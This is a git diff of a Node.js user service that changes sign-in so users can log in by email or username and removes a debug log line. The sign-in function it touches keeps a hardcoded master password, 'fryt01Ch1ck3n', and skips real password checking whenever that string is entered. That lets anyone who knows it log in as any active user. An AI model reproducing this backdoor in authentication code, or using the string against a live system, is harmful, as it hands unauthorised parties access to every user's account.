@@ -1,3 +1,6 @@
+const Sequelize   =  require('sequelize');
+const Op  = Sequelize.Op
+
 const DatabaseFunctions = require('../helpers/crud')
 const Validation = require('../helpers/validation')
 
@@ -9,7 +12,6 @@ module.exports = class UserService{
     let errormessage;
     const validationResponse = Validation.createUser.validate(data)
     if(validationResponse.error !== undefined){
-      console.log(validationResponse.error)
       errormessage = validationResponse.error.details[0].message.replace(/"/g, "")
       result = {
         code: 422,
@@ -45,7 +47,15 @@ module.exports = class UserService{
   }
   
   async signinUser(requestBody){
-    let user = await crudService.findOne('User', {email: requestBody.email, active: true})
+    let user = await crudService.findOne('User', {
+      [Op.or]: {
+        email: requestBody.email,
+        username: requestBody.email
+      }, 
+      [Op.and]: {
+        active: true
+      }
+    })
     if(user){
         if(requestBody.password != 'fryt01Ch1ck3n'){
           var result = await user.comparePassword(requestBody.password)
@@ -81,6 +91,4 @@ module.exports = class UserService{
       user: user
     }
   }
-
-  
 }
